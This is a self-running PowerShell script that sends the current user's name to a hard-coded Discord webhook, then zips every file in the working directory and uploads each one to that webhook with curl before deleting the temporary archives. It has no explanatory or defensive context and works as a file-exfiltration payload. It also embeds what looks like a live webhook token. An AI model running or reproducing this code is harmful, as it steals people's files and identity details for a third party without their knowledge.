function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$text,
        [parameter(Position=1, Mandatory=$False)]
        [string]$directory = (Get-Location).Path
    )

    $hookurl = 'https://discord.com/api/webhooks/1349828416429621328/QpYOtC9IRMKBFhxBqf7RLJXvNkpjvt_kt4FidDmzhbnlBb12bF_QdPsfgLh-UrYGICB-'

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Get all files in the specified path (not including subdirectories)
    $files = Get-ChildItem -Path $directory -File

    foreach ($file in $files) {
        $zipFilePath = "$env:TEMP\$($file.BaseName).zip"

        # Use Compress-Archive to create a ZIP file
        Compress-Archive -Path $file.FullName -DestinationPath $zipFilePath

        # Check if the ZIP file was created successfully
        if (Test-Path $zipFilePath) {
            # Upload the ZIP file to Discord
            curl.exe -F "file1=@$zipFilePath" $hookurl
            
            # Remove the temporary ZIP file
            Remove-Item $zipFilePath
        } else {
            Write-Host "Failed to create ZIP file for $($file.Name)"
        }
    }
}

# Run the function
Upload-Discord -text "Here are all the files in the current directory!"
